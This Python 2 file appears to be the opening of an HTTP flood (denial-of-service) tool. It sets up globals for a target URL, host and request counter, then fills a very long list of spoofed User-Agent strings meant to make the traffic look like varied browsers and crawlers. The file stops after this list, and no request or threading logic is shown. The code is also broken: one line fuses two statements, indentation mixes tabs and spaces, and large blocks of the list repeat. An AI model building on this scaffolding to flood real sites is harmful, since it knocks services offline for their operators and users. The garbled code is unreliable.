import urllib2

import sys

import threading

import random

import re

#global params

url=''

host=''

headers_useragents=[]

headers_referers=[]

request_counter=0

flag=0

safe=0

def inc_counter():

	global request_counter	request_counter+=1

def set_flag(val):

	global flag

	flag=val

def set_safe():

	global safe

	safe=1

	

# generates a user agent array

def useragent_list():

	global headers_useragents

	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')

	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')

	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')

	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')

	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')

	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')

	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')

	headers_useragents.append('agadine/1.x.x (+http://www.agada.de)')

	headers_useragents.append('Agent-SharewarePlazaFileCheckBot/2.0+(+http://www.SharewarePlaza.com)')

	headers_useragents.append('AgentName/0.1 libwww-perl/5.48')

	headers_useragents.append('AIBOT/2.1 By +(www.21seek.com A Real artificial intelligence search engine China)')

	headers_useragents.append('AideRSS/1.0 (aiderss.com)')

	headers_useragents.append('aipbot/1.0 (aipbot; http://www.aipbot.com; aipbot@aipbot.com)')

	headers_useragents.append('aipbot/2-beta (aipbot dev; http://aipbot.com; aipbot@aipbot.com)')

	headers_useragents.append('Akregator/1.2.9; librss/remnants')

	headers_useragents.append('Aladin/3.324')

	headers_useragents.append('Alcatel-BG3/1.0 UP.Browser/5.0.3.1.2')

	headers_useragents.append('Aleksika Spider/1.0 (+http://www.aleksika.com/)')

	headers_useragents.append('AlertInfo 2.0 (Powered by Newsbrain)')

	headers_useragents.append('AlkalineBOT/1.3')

	headers_useragents.append('AlkalineBOT/1.4 (1.4.0326.0 RTM)')

	headers_useragents.append('Allesklar/0.1 libwww-perl/5.46')

	headers_useragents.append('Alligator 1.31 (www.nearsoftware.com)')

	headers_useragents.append('Allrati/1.1 (+)')

	headers_useragents.append('AltaVista Intranet V2.0 AVS EVAL search@freeit.com')

	headers_useragents.append('AltaVista Intranet V2.0 Compaq Altavista Eval sveand@altavista.net')

	headers_useragents.append('AltaVista Intranet V2.0 evreka.com crawler@evreka.com')

	headers_useragents.append('AltaVista V2.0B crawler@evreka.com')

	headers_useragents.append('amaya/x.xx libwww/x.x.x')

	headers_useragents.append('AmfibiBOT')

	headers_useragents.append('Amfibibot/0.06 (Amfibi Web Search; http://www.amfibi.com; agent@amfibi.com)')

	headers_useragents.append('Amfibibot/0.07 (Amfibi Robot; http://www.amfibi.com; agent@amfibi.com)')

	headers_useragents.append('amibot')

	headers_useragents.append('Amiga-AWeb/3.4.167SE')

	headers_useragents.append('AmigaVoyager/3.4.4 (MorphOS/PPC native)')

	headers_useragents.append('AmiTCP Miami (AmigaOS 2.04)')

	headers_useragents.append('Amoi 8512/R21.0 NF-Browser/3.3')

	headers_useragents.append('amzn_assoc')

	headers_useragents.append('AnnoMille spider 0.1 alpha - http://www.annomille.it')

	headers_useragents.append('annotate_google; http://ponderer.org/download/annotate_google.user.js')

	headers_useragents.append('Anonymized by ProxyOS: http://www.megaproxy.com')

	headers_useragents.append('Anonymizer/1.1')

	headers_useragents.append('AnswerBus (http://www.answerbus.com/)')

	headers_useragents.append('AnswerChase PROve x.0')

	headers_useragents.append('AnswerChase x.0')

	headers_useragents.append('ANTFresco/x.xx')

	headers_useragents.append('antibot-V1.1.5/i586-linux-2.2')

	headers_useragents.append('AnzwersCrawl/2.0 (anzwerscrawl@anzwers.com.au;Engine)')

	headers_useragents.append('Apexoo Spider 1.x')

	headers_useragents.append('Aplix HTTP/1.0.1')

	headers_useragents.append('Aplix_SANYO_browser/1.x (Japanese)')

	headers_useragents.append('Aplix_SEGASATURN_browser/1.x (Japanese)')

	headers_useragents.append('Aport')

	headers_useragents.append('appie 1.1 (www.walhello.com)')

	headers_useragents.append('Apple iPhone v1.1.4 CoreMedia v1.0.0.4A102')

	headers_useragents.append('Apple-PubSub/65.1.1')

	headers_useragents.append('ArabyBot (compatible; Mozilla/5.0; GoogleBot; FAST Crawler 6.4; http://www.araby.com;)')

	headers_useragents.append('ArachBot')

	headers_useragents.append('Arachnoidea (arachnoidea@euroseek.com)')

	headers_useragents.append('aranhabot')

	headers_useragents.append('ArchitextSpider')

	headers_useragents.append('archive.org_bot')

	headers_useragents.append('Argus/1.1 (Nutch; http://www.simpy.com/bot.html; feedback at simpy dot com)')

	headers_useragents.append('Arikus_Spider')

	headers_useragents.append('Arquivo-web-crawler (compatible; heritrix/1.12.1 +http://arquivo-web.fccn.pt)')

	headers_useragents.append('ASAHA Search Engine Turkey V.001 (http://www.asaha.com/)')

	headers_useragents.append('Asahina-Antenna/1.x')

	headers_useragents.append('Asahina-Antenna/1.x (libhina.pl/x.x ; libtime.pl/x.x)')

	headers_useragents.append('ask.24x.info')

	headers_useragents.append('AskAboutOil/0.06-rcp (Nutch; http://www.nutch.org/docs/en/bot.html; nutch-agent@askaboutoil.com)')

	headers_useragents.append('asked/Nutch-0.8 (web crawler; http://asked.jp; epicurus at gmail dot com)')

	headers_useragents.append('ASPSeek/1.2.5')

	headers_useragents.append('ASPseek/1.2.9d')

	headers_useragents.append('ASPSeek/1.2.x')

	headers_useragents.append('ASPSeek/1.2.xa')

	headers_useragents.append('ASPseek/1.2.xx')

	headers_useragents.append('ASPSeek/1.2.xxpre')

	headers_useragents.append('ASSORT/0.10')

	headers_useragents.append('asterias/2.0')

	headers_useragents.append('AtlocalBot/1.1 +(http://www.atlocal.com/local-web-site-owner.html)')

	headers_useragents.append('Atomic_Email_Hunter/4.0')

	headers_useragents.append('Atomz/1.0')

	headers_useragents.append('atSpider/1.0')

	headers_useragents.append('Attentio/Nutch-0.9-dev (Attentios beta blog crawler; www.attentio.com; info@attentio.com)')

	headers_useragents.append('AU-MIC/2.0 MMP/2.0')

	headers_useragents.append('AUDIOVOX-SMT5600')

	headers_useragents.append('augurfind')

	headers_useragents.append('augurnfind V-1.x')

	headers_useragents.append('autoemailspider')

	headers_useragents.append('autohttp')

	headers_useragents.append('autowebdir 1.1 (www.autowebdir.com)')

	headers_useragents.append('AV Fetch 1.0')

	headers_useragents.append('Avant Browser (http://www.avantbrowser.com)')

	headers_useragents.append('AVSearch-1.0(peter.turney@nrc.ca)')

	headers_useragents.append('AVSearch-2.0-fusionIdx-14-CompetitorWebSites')

	headers_useragents.append('AVSearch-3.0(AltaVista/AVC)')

	headers_useragents.append('AWeb')

	headers_useragents.append('axadine/ (Axadine Crawler; http://www.axada.de/; )')

	headers_useragents.append('AxmoRobot - Crawling your site for better indexing on www.axmo.com search engine.')

	headers_useragents.append('Azureus 2.x.x.x')

	headers_useragents.append('BabalooSpider/1.3 (BabalooSpider; http://www.babaloo.si; spider@babaloo.si)')

	headers_useragents.append('BaboomBot/1.x.x (+http://www.baboom.us)')

	headers_useragents.append('BackStreet Browser 3.x')

	headers_useragents.append('BaiduImagespider+(+http://www.baidu.jp/search/s308.html)')

	headers_useragents.append('BaiDuSpider')

	headers_useragents.append('Baiduspider+(+http://help.baidu.jp/system/05.html)')

	headers_useragents.append('Baiduspider+(+http://www.baidu.com/search/spider.htm)')

	headers_useragents.append('Baiduspider+(+http://www.baidu.com/search/spider_jp.html)')

	headers_useragents.append('Balihoo/Nutch-1.0-dev (Crawler for Balihoo.com search engine - obeys robots.txt and robots meta tags ; http://balihoo.com/index.aspx; robot at balihoo dot com)')

	headers_useragents.append('BanBots/1.2 (spider@banbots.com)')

	headers_useragents.append('Barca/2.0.xxxx')

        headers_useragents.append('(DreamPassport/3.0; isao/MyDiGiRabi)')

	headers_useragents.append('(Privoxy/1.0)')

	headers_useragents.append('*/Nutch-0.9-dev')

	headers_useragents.append('+SitiDi.net/SitiDiBot/1.0 (+Have Good Day)')

	headers_useragents.append('-DIE-KRAEHE- META-SEARCH-ENGINE/1.1 http://www.die-kraehe.de')

	headers_useragents.append('123spider-Bot (Version: 1.02) powered by www.123spider.de')

	headers_useragents.append('192.comAgent')

	headers_useragents.append('1st ZipCommander (Net) - http://www.zipcommander.com/')

	headers_useragents.append('2Bone_LinkChecker/1.0 libwww-perl/5.64')

	headers_useragents.append('4anything.com LinkChecker v2.0')

	headers_useragents.append('8484 Boston Project v 1.0')

	headers_useragents.append(':robot/1.0 (linux) ( admin e-mail: undefined http://www.neofonie.de/loesungen/search/robot.html )')

	headers_useragents.append('A-Online Search')

	headers_useragents.append('A1 Keyword Research/1.0.2 (+http://www.micro-sys.dk/products/keyword-research/) miggibot/2007.03.27')

	headers_useragents.append('A1 Sitemap Generator/1.0 (+http://www.micro-sys.dk/products/sitemap-generator/) miggibot/2006.01.24')

	headers_useragents.append('AbachoBOT')

	headers_useragents.append('AbachoBOT (Mozilla compatible)')

	headers_useragents.append('ABCdatos BotLink/5.xx.xxx#BBL')

	headers_useragents.append('Aberja Checkomat 	Aberja Hybridsuchmaschine (Germany)')

	headers_useragents.append('abot/0.1 (abot; http://www.abot.com; abot@abot.com)')

	headers_useragents.append('About/0.1libwww-perl/5.47')

	headers_useragents.append('Accelatech RSSCrawler/0.4')

	headers_useragents.append('accoona 	Accoona Search robot')

	headers_useragents.append('Accoona-AI-Agent/1.1.1 (crawler at accoona dot com)')

	headers_useragents.append('Accoona-AI-Agent/1.1.2 (aicrawler at accoonabot dot com)')

	headers_useragents.append('Ace Explorer')

	headers_useragents.append('Ack (http://www.ackerm.com/)')

	headers_useragents.append('AcoiRobot')

	headers_useragents.append('Acoon Robot v1.50.001')

	headers_useragents.append('Acoon Robot v1.52 (http://www.acoon.de)')

	headers_useragents.append('Acoon-Robot 4.0.x.[xx] (http://www.acoon.de)')

	headers_useragents.append('Acoon-Robot v3.xx (http://www.acoon.de and http://www.acoon.com)')

	headers_useragents.append('Acorn/Nutch-0.9 (Non-Profit Search Engine; acorn.isara.org; acorn at isara dot org)')

	headers_useragents.append('ActiveBookmark 1.x')

	headers_useragents.append('Activeworlds')

	headers_useragents.append('ActiveWorlds/3.xx (xxx)')

	headers_useragents.append('Ad Muncher v4.xx.x')

	headers_useragents.append('Ad Muncher v4x Build xxxxx')

	headers_useragents.append('Adaxas Spider (http://www.adaxas.net/)')

	headers_useragents.append('Advanced Browser (http://www.avantbrowser.com)')

	headers_useragents.append('AESOP_com_SpiderMan')

        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')

	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')

	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')

	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')

	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')

	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')

	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')

	headers_useragents.append('(DreamPassport/3.0; isao/MyDiGiRabi)')

	headers_useragents.append('(Privoxy/1.0)')

	headers_useragents.append('*/Nutch-0.9-dev')

	headers_useragents.append('+SitiDi.net/SitiDiBot/1.0 (+Have Good Day)')

	headers_useragents.append('-DIE-KRAEHE- META-SEARCH-ENGINE/1.1 http://www.die-kraehe.de')

	headers_useragents.append('123spider-Bot (Version: 1.02) powered by www.123spider.de')

	headers_useragents.append('192.comAgent')

	headers_useragents.append('1st ZipCommander (Net) - http://www.zipcommander.com/')

	headers_useragents.append('2Bone_LinkChecker/1.0 libwww-perl/5.64')

	headers_useragents.append('4anything.com LinkChecker v2.0')

	headers_useragents.append('8484 Boston Project v 1.0')

	headers_useragents.append(':robot/1.0 (linux) ( admin e-mail: undefined http://www.neofonie.de/loesungen/search/robot.html )')

	headers_useragents.append('A-Online Search')

	headers_useragents.append('A1 Keyword Research/1.0.2 (+http://www.micro-sys.dk/products/keyword-research/) miggibot/2007.03.27')

	headers_useragents.append('A1 Sitemap Generator/1.0 (+http://www.micro-sys.dk/products/sitemap-generator/) miggibot/2006.01.24')

	headers_useragents.append('AbachoBOT')

	headers_useragents.append('AbachoBOT (Mozilla compatible)')

	headers_useragents.append('ABCdatos BotLink/5.xx.xxx#BBL')

	headers_useragents.append('Aberja Checkomat 	Aberja Hybridsuchmaschine (Germany)')

	headers_useragents.append('abot/0.1 (abot; http://www.abot.com; abot@abot.com)')

	headers_useragents.append('About/0.1libwww-perl/5.47')

	headers_useragents.append('Accelatech RSSCrawler/0.4')

	headers_useragents.append('accoona 	Accoona Search robot')

	headers_useragents.append('Accoona-AI-Agent/1.1.1 (crawler at accoona dot com)')

	headers_useragents.append('Accoona-AI-Agent/1.1.2 (aicrawler at accoonabot dot com)')

	headers_useragents.append('Ace Explorer')

	headers_useragents.append('Ack (http://www.ackerm.com/)')

	headers_useragents.append('AcoiRobot')

	headers_useragents.append('Acoon Robot v1.50.001')

	headers_useragents.append('Acoon Robot v1.52 (http://www.acoon.de)')

	headers_useragents.append('Acoon-Robot 4.0.x.[xx] (http://www.acoon.de)')

	headers_useragents.append('Acoon-Robot v3.xx (http://www.acoon.de and http://www.acoon.com)')

	headers_useragents.append('Acorn/Nutch-0.9 (Non-Profit Search Engine; acorn.isara.org; acorn at isara dot org)')

	headers_useragents.append('ActiveBookmark 1.x')

	headers_useragents.append('Activeworlds')

	headers_useragents.append('ActiveWorlds/3.xx (xxx)')

	headers_useragents.append('Ad Muncher v4.xx.x')

	headers_useragents.append('Ad Muncher v4x Build xxxxx')

	headers_useragents.append('Adaxas Spider (http://www.adaxas.net/)')

	headers_useragents.append('Advanced Browser (http://www.avantbrowser.com)')

	headers_useragents.append('AESOP_com_SpiderMan')

	headers_useragents.append('agadine/1.x.x (+http://www.agada.de)')

	headers_useragents.append('Agent-SharewarePlazaFileCheckBot/2.0+(+http://www.SharewarePlaza.com)')

	headers_useragents.append('AgentName/0.1 libwww-perl/5.48')

	headers_useragents.append('AIBOT/2.1 By +(www.21seek.com A Real artificial intelligence search engine China)')

	headers_useragents.append('AideRSS/1.0 (aiderss.com)')

	headers_useragents.append('aipbot/1.0 (aipbot; http://www.aipbot.com; aipbot@aipbot.com)')

	headers_useragents.append('aipbot/2-beta (aipbot dev; http://aipbot.com; aipbot@aipbot.com)')

	headers_useragents.append('Akregator/1.2.9; librss/remnants')

	headers_useragents.append('Aladin/3.324')

	headers_useragents.append('Alcatel-BG3/1.0 UP.Browser/5.0.3.1.2')

	headers_useragents.append('Aleksika Spider/1.0 (+http://www.aleksika.com/)')

	headers_useragents.append('AlertInfo 2.0 (Powered by Newsbrain)')

	headers_useragents.append('AlkalineBOT/1.3')

	headers_useragents.append('AlkalineBOT/1.4 (1.4.0326.0 RTM)')

	headers_useragents.append('Allesklar/0.1 libwww-perl/5.46')

	headers_useragents.append('Alligator 1.31 (www.nearsoftware.com)')

	headers_useragents.append('Allrati/1.1 (+)')

	headers_useragents.append('AltaVista Intranet V2.0 AVS EVAL search@freeit.com')

	headers_useragents.append('AltaVista Intranet V2.0 Compaq Altavista Eval sveand@altavista.net')

	headers_useragents.append('AltaVista Intranet V2.0 evreka.com crawler@evreka.com')

	headers_useragents.append('AltaVista V2.0B crawler@evreka.com')

	headers_useragents.append('amaya/x.xx libwww/x.x.x')

	headers_useragents.append('AmfibiBOT')

	headers_useragents.append('Amfibibot/0.06 (Amfibi Web Search; http://www.amfibi.com; agent@amfibi.com)')

	headers_useragents.append('Amfibibot/0.07 (Amfibi Robot; http://www.amfibi.com; agent@amfibi.com)')

	headers_useragents.append('amibot')

	headers_useragents.append('Amiga-AWeb/3.4.167SE')

	headers_useragents.append('AmigaVoyager/3.4.4 (MorphOS/PPC native)')

	headers_useragents.append('AmiTCP Miami (AmigaOS 2.04)')

	headers_useragents.append('Amoi 8512/R21.0 NF-Browser/3.3')

	headers_useragents.append('amzn_assoc')

	headers_useragents.append('AnnoMille spider 0.1 alpha - http://www.annomille.it')

	headers_useragents.append('annotate_google; http://ponderer.org/download/annotate_google.user.js')

	headers_useragents.append('Anonymized by ProxyOS: http://www.megaproxy.com')

	headers_useragents.append('Anonymizer/1.1')

	headers_useragents.append('AnswerBus (http://www.answerbus.com/)')

	headers_useragents.append('AnswerChase PROve x.0')

	headers_useragents.append('AnswerChase x.0')

	headers_useragents.append('ANTFresco/x.xx')

	headers_useragents.append('antibot-V1.1.5/i586-linux-2.2')

	headers_useragents.append('AnzwersCrawl/2.0 (anzwerscrawl@anzwers.com.au;Engine)')

	headers_useragents.append('Apexoo Spider 1.x')

	headers_useragents.append('Aplix HTTP/1.0.1')

	headers_useragents.append('Aplix_SANYO_browser/1.x (Japanese)')

	headers_useragents.append('Aplix_SEGASATURN_browser/1.x (Japanese)')

	headers_useragents.append('Aport')

	headers_useragents.append('appie 1.1 (www.walhello.com)')

	headers_useragents.append('Apple iPhone v1.1.4 CoreMedia v1.0.0.4A102')

	headers_useragents.append('Apple-PubSub/65.1.1')

	headers_useragents.append('ArabyBot (compatible; Mozilla/5.0; GoogleBot; FAST Crawler 6.4; http://www.araby.com;)')

	headers_useragents.append('ArachBot')

	headers_useragents.append('Arachnoidea (arachnoidea@euroseek.com)')

	headers_useragents.append('aranhabot')

	headers_useragents.append('ArchitextSpider')

	headers_useragents.append('archive.org_bot')

	headers_useragents.append('Argus/1.1 (Nutch; http://www.simpy.com/bot.html; feedback at simpy dot com)')

	headers_useragents.append('Arikus_Spider')

	headers_useragents.append('Arquivo-web-crawler (compatible; heritrix/1.12.1 +http://arquivo-web.fccn.pt)')

	headers_useragents.append('ASAHA Search Engine Turkey V.001 (http://www.asaha.com/)')

	headers_useragents.append('Asahina-Antenna/1.x')

	headers_useragents.append('Asahina-Antenna/1.x (libhina.pl/x.x ; libtime.pl/x.x)')

	headers_useragents.append('ask.24x.info')

	headers_useragents.append('AskAboutOil/0.06-rcp (Nutch; http://www.nutch.org/docs/en/bot.html; nutch-agent@askaboutoil.com)')

	headers_useragents.append('asked/Nutch-0.8 (web crawler; http://asked.jp; epicurus at gmail dot com)')

	headers_useragents.append('ASPSeek/1.2.5')

	headers_useragents.append('ASPseek/1.2.9d')

	headers_useragents.append('ASPSeek/1.2.x')

	headers_useragents.append('ASPSeek/1.2.xa')

	headers_useragents.append('ASPseek/1.2.xx')

	headers_useragents.append('ASPSeek/1.2.xxpre')

	headers_useragents.append('ASSORT/0.10')

	headers_useragents.append('asterias/2.0')

	headers_useragents.append('AtlocalBot/1.1 +(http://www.atlocal.com/local-web-site-owner.html)')

	headers_useragents.append('Atomic_Email_Hunter/4.0')

	headers_useragents.append('Atomz/1.0')

	headers_useragents.append('atSpider/1.0')

	headers_useragents.append('Attentio/Nutch-0.9-dev (Attentios beta blog crawler; www.attentio.com; info@attentio.com)')

	headers_useragents.append('AU-MIC/2.0 MMP/2.0')

	headers_useragents.append('AUDIOVOX-SMT5600')

	headers_useragents.append('augurfind')

	headers_useragents.append('augurnfind V-1.x')

	headers_useragents.append('autoemailspider')

	headers_useragents.append('autohttp')

	headers_useragents.append('autowebdir 1.1 (www.autowebdir.com)')

	headers_useragents.append('AV Fetch 1.0')

	headers_useragents.append('Avant Browser (http://www.avantbrowser.com)')

	headers_useragents.append('AVSearch-1.0(peter.turney@nrc.ca)')

	headers_useragents.append('AVSearch-2.0-fusionIdx-14-CompetitorWebSites')

	headers_useragents.append('AVSearch-3.0(AltaVista/AVC)')

	headers_useragents.append('AWeb')

	headers_useragents.append('axadine/ (Axadine Crawler; http://www.axada.de/; )')

	headers_useragents.append('AxmoRobot - Crawling your site for better indexing on www.axmo.com search engine.')

	headers_useragents.append('Azureus 2.x.x.x')

	headers_useragents.append('BabalooSpider/1.3 (BabalooSpider; http://www.babaloo.si; spider@babaloo.si)')

	headers_useragents.append('BaboomBot/1.x.x (+http://www.baboom.us)')

	headers_useragents.append('BackStreet Browser 3.x')

	headers_useragents.append('BaiduImagespider+(+http://www.baidu.jp/search/s308.html)')

	headers_useragents.append('BaiDuSpider')

	headers_useragents.append('Baiduspider+(+http://help.baidu.jp/system/05.html)')

	headers_useragents.append('Baiduspider+(+http://www.baidu.com/search/spider.htm)')

	headers_useragents.append('Baiduspider+(+http://www.baidu.com/search/spider_jp.html)')

	headers_useragents.append('Balihoo/Nutch-1.0-dev (Crawler for Balihoo.com search engine - obeys robots.txt and robots meta tags ; http://balihoo.com/index.aspx; robot at balihoo dot com)')

	headers_useragents.append('BanBots/1.2 (spider@banbots.com)')

	headers_useragents.append('Barca/2.0.xxxx')

	headers_useragents.append('BarcaPro/1.4.xxxx')

	headers_useragents.append('BarraHomeCrawler (albertof@barrahome.org)')

	headers_useragents.append('bCentral Billing Post-Process')

	headers_useragents.append('bdcindexer_2.6.2 (research@bdc)')

	headers_useragents.append('BDFetch')

	headers_useragents.append('BDNcentral Crawler v2.3 [en] (http://www.bdncentral.com/robot.html) (X11; I; Linux 2.0.44 i686)')

	headers_useragents.append('BeamMachine/0.5 (dead link remover of www.beammachine.net)')

	headers_useragents.append('beautybot/1.0 (+http://www.uchoose.de/crawler/beautybot/)')

	headers_useragents.append('BebopBot/2.5.1 ( crawler http://www.apassion4jazz.net/bebopbot.html )')

	headers_useragents.append('BeebwareDirectory/v0.01')

	headers_useragents.append('Big Brother (http://pauillac.inria.fr/~fpottier/)')

	headers_useragents.append('Big Fish v1.0')

	headers_useragents.append('BigBrother/1.6e')

	headers_useragents.append('BigCliqueBOT/1.03-dev (bigclicbot; http://www.bigclique.com; bot@bigclique.com)')

	headers_useragents.append('BIGLOTRON (Beta 2;GNU/Linux)')

	headers_useragents.append('Bigsearch.ca/Nutch-x.x-dev (Bigsearch.ca Internet Spider; http://www.bigsearch.ca/; info@enhancededge.com)')

	headers_useragents.append('Bilbo/2.3b-UNIX')

	headers_useragents.append('BilgiBetaBot/0.8-dev (bilgi.com (Beta) ; http://lucene.apache.org/nutch/bot.html; nutch-agent@lucene.apache.org)')

	headers_useragents.append('BilgiBot/1.0(beta) (http://www.bilgi.com/; bilgi at bilgi dot com)')

	headers_useragents.append('billbot wjj@cs.cmu.edu')

	headers_useragents.append('Bitacle bot/1.1')

	headers_useragents.append('Bitacle Robot (V:1.0;) (http://www.bitacle.com)')

	headers_useragents.append('Biyubi/x.x (Sistema Fenix; G11; Familia Toledo; es-mx)')

	headers_useragents.append('BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0)')

	headers_useragents.append('BlackWidow')

	headers_useragents.append('BlackWidow')

	headers_useragents.append('Blaiz-Bee/1.0 (+http://www.blaiz.net)')

	headers_useragents.append('Blaiz-Bee/2.00.8222 (BE Internet Search Engine http://www.rawgrunt.com)')

	headers_useragents.append('Blaiz-Bee/2.00.xxxx (+http://www.blaiz.net)')

	headers_useragents.append('BlitzBOT@tricus.net')

	headers_useragents.append('BlitzBOT@tricus.net (Mozilla compatible)')

	headers_useragents.append('BlockNote.Net')

	headers_useragents.append('BlogBot/1.x')

	headers_useragents.append('BlogBridge 2.13 (http://www.blogbridge.com/)')

	headers_useragents.append('Bloglines Title Fetch/1.0 (http://www.bloglines.com)')

	headers_useragents.append('Bloglines-Images/0.1 (http://www.bloglines.com)')

	headers_useragents.append('Bloglines/3.1 (http://www.bloglines.com)')

	headers_useragents.append('BlogMap (http://www.feedmap.net)')

	headers_useragents.append('Blogpulse (info@blogpulse.com)')

	headers_useragents.append('BlogPulseLive (support@blogpulse.com)')

	headers_useragents.append('BlogSearch/1.x +http://www.icerocket.com/')

	headers_useragents.append('blogsearchbot-pumpkin-3')

	headers_useragents.append('BlogsNowBot) V 2.01 (+http://www.blogsnow.com/)')

	headers_useragents.append('BlogVibeBot-v1.1 (spider@blogvibe.nl)')

	headers_useragents.append('blogWatcher_Spider/0.1 (http://www.lr.pi.titech.ac.jp/blogWatcher/)')

	headers_useragents.append('BlogzIce/1.0 (+http://icerocket.com; rhodes@icerocket.com)')

	headers_useragents.append('BlogzIce/1.0 +http://www.icerocket.com/')

	headers_useragents.append('BloobyBot')

	headers_useragents.append('Bloodhound/Nutch-0.9 (Testing Crawler for Research - obeys robots.txt and robots meta tags ; http://balihoo.com/index.aspx; robot at balihoo dot com)')

	headers_useragents.append('bluefish 0.6 HTML editor')

	headers_useragents.append('BMCLIENT')

	headers_useragents.append('BMLAUNCHER')

	headers_useragents.append('Bobby/4.0.x RPT-HTTPClient/0.3-3E')

	headers_useragents.append('boitho.com-dc/0.xx (http://www.boitho.com/dcbot.html)')

	headers_useragents.append('boitho.com-robot/1.x')

	headers_useragents.append('boitho.com-robot/1.x (http://www.boitho.com/bot.html)')

	headers_useragents.append('Bookdog/x.x')

	headers_useragents.append('Bookmark Buddy bookmark checker (http://www.bookmarkbuddy.net/)')

	headers_useragents.append('Bookmark Renewal Check Agent [http://www.bookmark.ne.jp/]')

	headers_useragents.append('Bookmark Renewal Check Agent [http://www.bookmark.ne.jp/]')

	headers_useragents.append('BookmarkBase(2/;http://bookmarkbase.com)')

	headers_useragents.append('Bot mailto:craftbot@yahoo.com')

	headers_useragents.append('BPImageWalker/2.0 (www.bdbrandprotect.com)')

	headers_useragents.append('BravoBrian bstop.bravobrian.it')

	headers_useragents.append('BravoBrian SpiderEngine MarcoPolo')

	headers_useragents.append('BrightCrawler (http://www.brightcloud.com/brightcrawler.asp)')

	headers_useragents.append('BruinBot (+http://webarchive.cs.ucla.edu/bruinbot.html)')

	headers_useragents.append('BSDSeek/1.0')

	headers_useragents.append('BStop.BravoBrian.it Agent Detector')

	headers_useragents.append('BTbot/0.x (+http://www.btbot.com/btbot.html)')

	headers_useragents.append('BTWebClient/180B(9704)')

	headers_useragents.append('BuildCMS crawler (http://www.buildcms.com/crawler)')

	headers_useragents.append('Bulkfeeds/r1752 (http://bulkfeeds.net/)')

	headers_useragents.append('BullsEye')

	headers_useragents.append('bumblebee@relevare.com')

	headers_useragents.append('BunnySlippers')

	headers_useragents.append('BurstFindCrawler/1.1 (crawler.burstfind.com; http://crawler.burstfind.com; crawler@burstfind.com)')

	headers_useragents.append('Buscaplus Robi/1.0 (http://www.buscaplus.com/robi/)')

	headers_useragents.append('BW-C-2.0')

	headers_useragents.append('bwh3_user_agent')

	headers_useragents.append('Cabot/Nutch-0.9 (Amfibis web-crawling robot; http://www.amfibi.com/cabot/; agent@amfibi.com)')

	headers_useragents.append('Cabot/Nutch-1.0-dev (Amfibis web-crawling robot; http://www.amfibi.com/cabot/; agent@amfibi.com)')

	headers_useragents.append('CamelHttpStream/1.0')

	headers_useragents.append('Cancer Information and Support International;')

	headers_useragents.append('carleson/1.0')

	headers_useragents.append('Carnegie_Mellon_University_Research_WebBOT-->PLEASE READ-->http://www.andrew.cmu.edu/~brgordon/webbot/index.html http://www.andrew.cmu.edu/~brgordon/webbot/index.html')

	headers_useragents.append('Carnegie_Mellon_University_WebCrawler http://www.andrew.cmu.edu/~brgordon/webbot/index.html')

	headers_useragents.append('Catall Spider')

	headers_useragents.append('CazoodleBot/CazoodleBot-0.1 (CazoodleBot Crawler; http://www.cazoodle.com/cazoodlebot; cazoodlebot@cazoodle.com)')

